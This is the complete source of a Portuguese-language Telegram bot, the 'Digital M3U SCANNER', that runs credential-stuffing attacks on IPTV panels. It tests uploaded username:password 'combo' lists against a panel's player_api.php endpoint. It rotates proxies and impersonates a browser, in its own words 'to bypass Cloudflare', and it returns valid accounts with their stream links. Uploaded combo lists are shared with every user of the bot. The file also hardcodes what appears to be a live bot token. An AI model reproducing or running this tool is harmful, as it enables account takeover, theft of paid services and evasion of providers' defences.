# bot criado por @Digital_Apps (FAVOR MANTER OS CREDITOS E PROIBIDO A VENDA DESTE CODIGO)
import time
import os
import threading
import urllib3
import re
import sqlite3
from datetime import datetime
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random

# Importação usando curl_cffi para burlar o Cloudflare
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# ⚙️ CONFIGURAÇÕES PRINCIPAIS
# ==========================================
API_TOKEN = "8399784341:AAH1EdWFp1XEdWSIuHRNSGEh2faxrJBmydM"
ADMIN_ID = "605843575"
DB_PATH = "bot_data.db"

MAX_FILE_SIZE_MB = 8
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024
CONCORRENCIA_MAXIMA = 3  

# Pasta para salvar combos compartilhadas
COMBO_FOLDER = "combos"
if not os.path.exists(COMBO_FOLDER):
    os.makedirs(COMBO_FOLDER)

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 🗄️ BANCO DE DADOS (SQLite Local)
# ==========================================
def get_db_connection():
    return sqlite3.connect(DB_PATH)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            proxy TEXT UNIQUE NOT NULL,
            name TEXT DEFAULT 'Proxy'
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS bot_stats (
            id INTEGER PRIMARY KEY CHECK (id = 1),
            total_tested INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0
        )
    """)
    cur.execute("INSERT OR IGNORE INTO bot_stats (id, total_tested, total_hits) VALUES (1, 0, 0)")
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users_served (
            chat_id TEXT PRIMARY KEY
        )
    """)
    conn.commit()
    conn.close()

def load_proxies():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT proxy, name FROM proxies")
    rows = cur.fetchall()
    conn.close()
    return [{"proxy": r[0], "name": r[1]} for r in rows]

def save_proxy(proxy_str, name="Proxy"):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO proxies (proxy, name) VALUES (?, ?)", (proxy_str, name))
    conn.commit()
    conn.close()

def delete_proxy(proxy_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM proxies WHERE id = ?", (proxy_id,))
    conn.commit()
    conn.close()

def clear_all_proxies():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM proxies")
    conn.commit()
    conn.close()

def update_stats(tested=0, hits=0):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("UPDATE bot_stats SET total_tested = total_tested + ?, total_hits = total_hits + ? WHERE id = 1", (tested, hits))
    conn.commit()
    conn.close()

def get_stats():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT total_tested, total_hits FROM bot_stats WHERE id = 1")
    row = cur.fetchone()
    cur.execute("SELECT COUNT(*) FROM users_served")
    users_count = cur.fetchone()[0]
    conn.close()
    return row[0], row[1], users_count

def add_user_served(chat_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users_served (chat_id) VALUES (?)", (str(chat_id),))
    conn.commit()
    conn.close()

init_db()
PROXIES_LIST_DEFAULT = load_proxies()

user_data = {}
task_queue = []
queue_lock = threading.Lock()

# ==========================================
# 🛡️ FUNÇÕES BASE, PING E CHECKER ÚNICO
# ==========================================
def ocultar_senha_proxy(proxy_str):
    if not proxy_str: return "Direto"
    if '@' in proxy_str:
        return proxy_str.split('@')[-1] 
    return proxy_str

def test_proxy(p_info, server_url):
    p = p_info['proxy']
    start = time.time()
    try:
        p_url = p if p.startswith('http') else f"http://{p}"
        pd = {"http": p_url, "https": p_url}
        if not server_url.startswith('http'): 
            server_url = 'http://' + server_url
        response = requests.get(server_url, proxies=pd, timeout=10, verify=False, impersonate="chrome110")
        ping_ms = int((time.time() - start) * 1000)
        return ping_ms
    except Exception as e:
        print(f"[ERRO PROXY] O proxy falhou: {str(e)}")
        return -1

def test_all_proxies(proxy_dict_list, server_url):
    results = {}
    threads = []
    def check(p_info):
        results[p_info['proxy']] = test_proxy(p_info, server_url)
    for p_info in proxy_dict_list:
        t = threading.Thread(target=check, args=(p_info,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    return results

def check_single_url(chat_id, server_url, username, password, proxy_url=None):
    start_time = time.time()
    is_active = False
    try:
        username = username.strip()
        password = password.strip()
        server_url = server_url.strip().rstrip('/')
        
        if not server_url.startswith('http'): 
            server_url = 'http://' + server_url
            
        api_url = f"{server_url}/player_api.php?username={username}&password={password}"
        
        app_headers = {
            "User-Agent": "IPTVSmartersPro",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        
        proxies_dict = None
        if proxy_url:
            p_url = proxy_url if proxy_url.startswith('http') else f"http://{proxy_url}"
            proxies_dict = {"http": p_url, "https": p_url}
            
        with requests.Session(impersonate="chrome110") as session:
            session.headers.clear()
            session.headers.update(app_headers)
            
            timeout_config = 30 if proxy_url else 15
            response = session.get(api_url, proxies=proxies_dict, timeout=timeout_config, verify=False)
            ping_ms = int((time.time() - start_time) * 1000)
            status_code = response.status_code
            
            proxy_seguro = ocultar_senha_proxy(proxy_url)
            print(f"[{username}] Proxy: {proxy_seguro} | Status: {status_code} | Ping: {ping_ms}ms")
            
            if status_code == 200:
                try: 
                    json_data = response.json()
                    user_info = json_data.get('user_info', {})
                    auth = user_info.get('auth')
                    status_conta = str(user_info.get('status', '')).strip().capitalize()
                    
                    is_active = (auth == 1 or auth == "1") or status_conta.lower() in ['active', 'active!', 'trial', 'ativo', 'ativa', 'enabled']
                    
                    if is_active:
                        server_info = json_data.get('server_info', {})
                        port = server_info.get('port', '80')
                        base_host = server_url.rstrip('/')
                        m3u_link = f"{base_host}/get.php?username={username}&password={password}&type=m3u_plus"
                        
                        c_at = user_info.get('created_at')
                        e_at = user_info.get('exp_date')
                        
                        try: creation_date = datetime.fromtimestamp(int(c_at)).strftime('%d/%m/%Y') if c_at else "N/A"
                        except: creation_date = "N/A"
                        
                        try: expiration_date = datetime.fromtimestamp(int(e_at)).strftime('%d/%m/%Y') if e_at else "N/A"
                        except: expiration_date = "N/A"

                        px_display_msg = f"<code>{proxy_seguro}</code> ({ping_ms}ms)" if proxy_url else "Direto (Sem Proxy)"

                        result_text = (
                            "╭─➡️ <b>Digital M3U SCANNER</b>\n"
                            "├●📩MENSAGEM: ► <code>Conta ativa!</code>\n"
                            f"╟✅STATUS: ► <code>{user_info.get('status', 'active')}</code>\n"
                            f"╟✅PLANO: ► <code>{user_info.get('package', 'PACOTE COMPLETO')}</code>\n"
                            f"╟💁USUARIO: ► <code>{username}</code>\n"
                            f"╟🔐SENHA: ► <code>{password}</code>\n"
                            f"╟📅CRIADO: ► <code>{creation_date}</code>\n"
                            f"╟📆EXPIRA: ► <code>{expiration_date}</code>\n"
                            f"╟🙋CON.MAX: ► <code>{user_info.get('max_connections', '0')}</code>\n"
                            f"╟👀CON.ATIVAS: ► <code>{user_info.get('active_cons', '0')}</code>\n"
                            f"╟🌍HOST: ► <code>{base_host}</code>\n"
                            f"╟📎PORTA: ► <code>{port}</code>\n"
                            f"╟📎M3U: ► <code>{m3u_link}</code>\n"
                            "╰─➡️ <b>By @digital_epgAPI_bot</b>"
                        )
                        try:
                            bot.send_message(chat_id, result_text, parse_mode='HTML', disable_web_page_preview=True)
                        except Exception as e:
                            print(f"[ERRO TELEGRAM]: Não consegui enviar a mensagem do hit: {e}")

                    return json_data, ping_ms, proxy_url, status_code, is_active
                
                except Exception as e: 
                    return None, ping_ms, proxy_url, "Resposta HTML (API Bloqueada)", False
            
            return None, ping_ms, proxy_url, status_code, False
            
    except Exception as e: 
        print(f"[{username}] Falha de Conexão: {str(e)}")
        return None, int((time.time() - start_time) * 1000), proxy_url, "Timeout/Falha", False

# ==========================================
# 🚦 SISTEMA DE FILA E WORKERS
# ==========================================
def queue_worker(worker_id):
    global CONCORRENCIA_MAXIMA
    while True:
        if worker_id > CONCORRENCIA_MAXIMA: break 
        task = None
        with queue_lock:
            if len(task_queue) > 0:
                task = task_queue.pop(0)
                for index, queued_task in enumerate(task_queue):
                    try:
                        bot.edit_message_text(f"⏳ *Fila de Espera*\nSua posição foi atualizada para: *{index + 1}º*", chat_id=queued_task['chat_id'], message_id=queued_task['msg_id'], parse_mode='Markdown')
                    except: pass
        if task:
            try:
                bot.send_message(task['chat_id'], f"🚀 *Sua vez!* Iniciando testes (Slot {worker_id})...", parse_mode='Markdown')
                process_file_logic(task['chat_id'], task['file_path'], task['server_url'], task['is_local'], task['proxy_url'])
            except Exception as e:
                bot.send_message(task['chat_id'], f"❌ Erro na fila: {e}")
        else:
            time.sleep(2)

def add_to_queue(chat_id, file_path, server_url, is_local, proxy_url):
    add_user_served(chat_id)
    with queue_lock:
        if any(t['chat_id'] == chat_id for t in task_queue):
            bot.send_message(chat_id, "⚠️ Você já tem um arquivo na fila.", parse_mode='Markdown')
            return
        pos = len(task_queue) + 1
        msg = bot.send_message(chat_id, f"⏳ *Fila de Espera*\nPosição atual na fila: *{pos}º*", parse_mode='Markdown')
        task_queue.append({
            'chat_id': chat_id, 'file_path': file_path, 'server_url': server_url,
            'is_local': is_local, 'proxy_url': proxy_url, 'msg_id': msg.message_id
        })

# ==========================================
# 👑 PAINEL ADMINISTRATIVO (/admin)
# ==========================================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        bot.send_message(message.chat.id, "⛔ *Acesso Negado.*", parse_mode='Markdown')
        return
    show_admin_menu(message.chat.id)

def show_admin_menu(chat_id, message_id=None):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📊 Ver Estatísticas", callback_data="adm_stats"))
    markup.add(InlineKeyboardButton("⚙️ Controlar Vagas", callback_data="adm_threads"))
    markup.add(InlineKeyboardButton("🛡️ Gerenciar Proxies", callback_data="adm_proxies"))
    markup.add(InlineKeyboardButton("🗑️ Esvaziar Fila", callback_data="adm_clear"))
    texto = "👨‍💻 *PAINEL DE CONTROLE*\nSelecione uma opção:"
    if message_id: bot.edit_message_text(texto, chat_id=chat_id, message_id=message_id, reply_markup=markup, parse_mode='Markdown')
    else: bot.send_message(chat_id, texto, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_callbacks(call):
    global CONCORRENCIA_MAXIMA, PROXIES_LIST_DEFAULT
    chat_id, msg_id = call.message.chat.id, call.message.message_id
    if str(call.from_user.id) != str(ADMIN_ID): return bot.answer_callback_query(call.id, "⛔ Negado.")
    
    if call.data == "adm_stats":
        tested, hits, users = get_stats()
        stats_text = f"📊 *ESTATÍSTICAS GERAIS*\n\n👥 *Usuários:* {users}\n🔄 *Combos Testados:* {tested}\n✅ *Hits Encontrados:* {hits}\n⏳ *Pessoas na Fila:* {len(task_queue)}\n⚙️ *Vagas Ativas:* {CONCORRENCIA_MAXIMA}"
        bot.edit_message_text(stats_text, chat_id=chat_id, message_id=msg_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Voltar", callback_data="adm_back")), parse_mode='Markdown')
    elif call.data == "adm_threads":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("➖", callback_data="adm_th_down"), InlineKeyboardButton("➕", callback_data="adm_th_up"))
        markup.add(InlineKeyboardButton("⬅️ Voltar", callback_data="adm_back"))
        bot.edit_message_text(f"⚙️ *Vagas Simultâneas:* {CONCORRENCIA_MAXIMA}", chat_id=chat_id, message_id=msg_id, reply_markup=markup, parse_mode='Markdown')
    elif call.data == "adm_th_up":
        CONCORRENCIA_MAXIMA += 1
        threading.Thread(target=queue_worker, args=(CONCORRENCIA_MAXIMA,), daemon=True).start()
        admin_callbacks(call)
    elif call.data == "adm_th_down":
        if CONCORRENCIA_MAXIMA > 1: CONCORRENCIA_MAXIMA -= 1
        admin_callbacks(call)
    elif call.data == "adm_proxies":
        PROXIES_LIST_DEFAULT = load_proxies()
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("➕ Adicionar Proxies", callback_data="adm_px_add"))
        markup.add(InlineKeyboardButton("🗑️ Limpar Todos", callback_data="adm_px_clear"))
        markup.add(InlineKeyboardButton("⬅️ Voltar", callback_data="adm_back"))
        bot.edit_message_text(f"🛡️ *Proxies do Bot:* {len(PROXIES_LIST_DEFAULT)}", chat_id=chat_id, message_id=msg_id, reply_markup=markup, parse_mode='Markdown')
    elif call.data == "adm_px_add":
        msg = bot.send_message(chat_id, "📝 *Envie os proxies*\nFormato: `Nome|Proxy` ou apenas `Proxy` (um por linha)\n\nEx:\n`Premium BR|user:pass@ip:port`", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_add_proxies)
    elif call.data == "adm_px_clear":
        clear_all_proxies()
        PROXIES_LIST_DEFAULT = []
        bot.answer_callback_query(call.id, "✅ Lista de proxies limpa!", show_alert=True)
        admin_callbacks(call)
    elif call.data == "adm_back":
        show_admin_menu(chat_id, msg_id)

def process_add_proxies(message):
    global PROXIES_LIST_DEFAULT
    if str(message.from_user.id) != str(ADMIN_ID): return
    proxies_input = message.text.strip().split('\n')
    added = 0
    for p in proxies_input:
        p = p.strip()
        if p:
            if '|' in p:
                name, proxy = p.split('|', 1)
                save_proxy(proxy.strip(), name.strip())
            else:
                save_proxy(p, "Proxy")
            added += 1
    PROXIES_LIST_DEFAULT = load_proxies()
    bot.send_message(message.chat.id, f"✅ *{added}* proxies processados e salvos localmente!", parse_mode='Markdown')
    show_admin_menu(message.chat.id)

# ==========================================
# INTERAÇÃO NORMAL DO USUÁRIO
# ==========================================
@bot.message_handler(commands=['start'])
def start_command(message):
    texto_start = (
        "🚀 *BEM-VINDO AO DIGITAL M3U SCANNER!*\n\n"
        "🔍 *COMO INICIAR UM TESTE:*\n"
        "Envie o comando `/url` seguido do link do painel IPTV.\n"
        "Exemplo: `/url http://dominio.com`\n\n"
        "🛡️ *DICA DE OURO: PROXIES E CLOUDFLARE*\n"
        "Muitos servidores hoje usam proteções severas (como Cloudflare) que bloqueiam conexões repetidas. Se você notar muitos erros `403`, `502` ou `API Bloqueada`, o IP foi banido pelo servidor.\n\n"
        "👉 *A Solução:* Quando o bot pedir para selecionar o proxy, escolha **SEMPRE** a opção 🔄 *Rotação Automática*. Isso fará o bot trocar de IP a cada conta testada, enganando o Cloudflare e garantindo os seus Hits!\n\n"
        "📁 *SOBRE AS COMBOS (LISTAS):*\n"
        "• O arquivo deve ser sempre `.txt`.\n"
        "• O formato obrigatório dentro do arquivo é `usuario:senha` (um por linha, sem espaços).\n"
        "• Após escolher o proxy, você poderá escolher uma combo já salva no servidor ou enviar a sua própria.\n\n"
        "⚡ *Pronto para começar? Mande a sua /url !*"
    )
    bot.send_message(message.chat.id, texto_start, parse_mode='Markdown')

@bot.message_handler(commands=['url'])
def url_command(message):
    chat_id = message.chat.id
    add_user_served(chat_id)
    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2: return bot.send_message(chat_id, "⚠️ Uso: `/url http://dominio.com`", parse_mode='Markdown')
    server_url = parts[1].strip()
    user_data[chat_id] = {'server_url': server_url, 'cancel': False}
    
    bot.send_message(chat_id, "⌛ *Verificando latência dos proxies...*", parse_mode='Markdown')
    proxies = load_proxies()
    p_results = test_all_proxies(proxies, server_url)
    
    markup = InlineKeyboardMarkup()
    if len(proxies) > 0:
        markup.add(InlineKeyboardButton("🔄 Rotação Automática", callback_data="pxsel_auto"))
        
    markup.add(InlineKeyboardButton("⚡ Sem Proxy", callback_data="pxsel_none"))
    
    for p_info in proxies:
        p_str = p_info['proxy']
        ping = p_results.get(p_str, -1)
        status = f"{ping}ms" if ping != -1 else "Offline"
        btn_text = f"🛡️ {p_info['name']} | {status}"
        callback_val = f"pxsel_{p_str[:50]}" 
        markup.add(InlineKeyboardButton(btn_text, callback_data=callback_val))
    
    bot.send_message(chat_id, f"✅ Host: `{server_url}`\nSelecione o proxy para usar:", reply_markup=markup, parse_mode='Markdown')

def ask_combo_menu(chat_id):
    markup = InlineKeyboardMarkup()
    arquivos = [f for f in os.listdir(COMBO_FOLDER) if f.endswith('.txt')]
    
    if arquivos:
        markup.add(InlineKeyboardButton(f"📂 -- ESCOLHER ARQUIVO ({len(arquivos)}) --", callback_data="ignore"))
        for arq in arquivos:
            markup.add(InlineKeyboardButton(f"📄 {arq}", callback_data=f"use_file|{arq}"))
    else:
        markup.add(InlineKeyboardButton("⚠️ Nenhum combo no servidor", callback_data="ignore"))

    markup.add(InlineKeyboardButton("📤 UPLOAD DE NOVO COMBO", callback_data="combo_upload"))
    
    bot.send_message(chat_id, "🗄️ *Banco de Combos Compartilhado*\nEscolha uma lista existente ou envie uma nova para todos:", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: not call.data.startswith("adm_"))
def user_callbacks(call):
    chat_id, msg_id = call.message.chat.id, call.message.message_id
    
    if chat_id not in user_data and call.data != "cancel_task":
        return bot.answer_callback_query(call.id, "Sessão expirada. Envie /url.", show_alert=True)
    
    if call.data == "cancel_task":
        if chat_id in user_data: user_data[chat_id]['cancel'] = True
        return
    
    if call.data.startswith("pxsel_"):
        sel = call.data.replace("pxsel_", "")
        if sel == "none":
            user_data[chat_id]['proxy_url'] = None
        elif sel == "auto":
            user_data[chat_id]['proxy_url'] = "auto"
        else:
            proxies = load_proxies()
            found = next((p['proxy'] for p in proxies if p['proxy'].startswith(sel)), None)
            user_data[chat_id]['proxy_url'] = found
        ask_combo_menu(chat_id)

    elif call.data == "combo_upload":
        msg = bot.send_message(chat_id, "📤 *Envie agora o arquivo .txt*\nEle ficará visível para todos os usuários!", parse_mode='Markdown')
        bot.register_next_step_handler(msg, save_combo_file)

    elif call.data.startswith("use_file|"):
        filename = call.data.split("|", 1)[1]
        file_path = os.path.join(COMBO_FOLDER, filename)
        
        if os.path.exists(file_path):
            bot.send_message(chat_id, f"✅ Selecionado: `{filename}`", parse_mode='Markdown')
            add_to_queue(chat_id, file_path, user_data[chat_id]['server_url'], True, user_data[chat_id]['proxy_url'])
        else:
            bot.send_message(chat_id, "❌ Esse arquivo não existe mais.")
            ask_combo_menu(chat_id)

    elif call.data == "ignore":
        bot.answer_callback_query(call.id)

def save_combo_file(message):
    chat_id = message.chat.id
    if not message.document:
        bot.send_message(chat_id, "❌ Erro: Você deve enviar um arquivo (Documento). Tente novamente no menu.")
        return ask_combo_menu(chat_id)

    if not message.document.file_name.endswith('.txt'):
        bot.send_message(chat_id, "❌ Erro: Apenas arquivos .txt são permitidos.")
        return ask_combo_menu(chat_id)

    try:
        file_name = message.document.file_name
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        save_path = os.path.join(COMBO_FOLDER, file_name)

        with open(save_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.send_message(chat_id, f"✅ *Arquivo Salvo!*\nNome: `{file_name}`\nAgora ele está disponível para todos.", parse_mode='Markdown')
        ask_combo_menu(chat_id) 
    except Exception as e:
        bot.send_message(chat_id, f"❌ Erro ao salvar: {e}")

def process_file_logic(chat_id, file_path, server_url, is_local, proxy_url):
    if not os.path.exists(file_path): return
    if chat_id in user_data: user_data[chat_id]['cancel'] = False
    
    hits_path = f"hits_{chat_id}.txt"
    hits, bads = 0, 0
    
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        total = len(lines)
        if total == 0: return
        
        proxies_list = []
        if proxy_url == "auto":
            proxies_db = load_proxies()
            proxies_list = [p['proxy'] for p in proxies_db]
        proxy_index = 0
        
        last_status_code = "Aguardando..." 
        ping_atual = 0
        
        cancel_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 CANCELAR", callback_data="cancel_task"))
        status_msg = bot.send_message(chat_id, f"⚙️ *Testando:* 0/{total}\n✅ *Sucesso:* 0", reply_markup=cancel_markup, parse_mode='Markdown')
        last_upd = time.time()
        
        for i, line in enumerate(lines, 1):
            if user_data.get(chat_id, {}).get('cancel', False): break
            update_stats(tested=1)
            try:
                if ':' not in line: bads += 1; continue
                usr, pwd = line.split(':', 1)
                
                current_proxy = proxy_url
                if proxy_url == "auto" and proxies_list:
                    current_proxy = proxies_list[proxy_index % len(proxies_list)]
                    proxy_index += 1
                elif proxy_url == "auto" and not proxies_list:
                    current_proxy = None
                
                res, ping_atual, px, current_status, is_active = check_single_url(chat_id, server_url, usr, pwd, current_proxy)
                last_status_code = current_status 
                
                time.sleep(0.5) 
                
                if is_active:
                    hits += 1
                    update_stats(hits=1)
                    with open(hits_path, "a") as hf: hf.write(f"{usr.strip()}:{pwd.strip()}\n")
                else: 
                    bads += 1
                    
            except Exception as e: 
                bads += 1
                last_status_code = "Erro no Teste"
                
            if time.time() - last_upd > 3.0 or i == total:
                try:
                    px_seguro = ocultar_senha_proxy(px) 
                    
                    if proxy_url == "auto": proxy_info = f"\n🛡️ *Proxy:* `🔄 Em Rotação ({px_seguro})`"
                    elif px: proxy_info = f"\n🛡️ *Proxy:* `{px_seguro}`"
                    else: proxy_info = "\n🛡️ *Proxy:* `Direto`"
                    
                    ping_info = f"\n⚡ *Ping Médio:* `{ping_atual}ms`" if ping_atual else "\n⚡ *Ping Médio:* `---`"
                    status_info = f"\n⚠️ *Status:* `{last_status_code}`"
                    
                    texto_painel = f"⚙️ *Testando:* {i}/{total}\n✅ *Hits:* {hits}\n❌ *Erros:* {bads}{proxy_info}{ping_info}{status_info}"
                    bot.edit_message_text(texto_painel, chat_id=chat_id, message_id=status_msg.message_id, reply_markup=cancel_markup, parse_mode='Markdown')
                    last_upd = time.time()
                except: pass 
                
        bot.send_message(chat_id, "🏁 *Finalizado!*")
        if hits > 0 and os.path.exists(hits_path):
            with open(hits_path, "rb") as doc: bot.send_document(chat_id, doc)
            os.remove(hits_path)
    finally:
        # Arquivos da pasta de combos NÃO são mais deletados para que todos possam usar.
        # Apenas removemos o arquivo de hits temporário caso algo dê errado.
        if os.path.exists(hits_path):
            try: os.remove(hits_path)
            except: pass

if __name__ == "__main__":
    print("🚀 Bot iniciado! Aguardando comandos...")
    for i in range(CONCORRENCIA_MAXIMA):
        threading.Thread(target=queue_worker, args=(i+1,), daemon=True).start()
    bot.infinity_polling(timeout=60)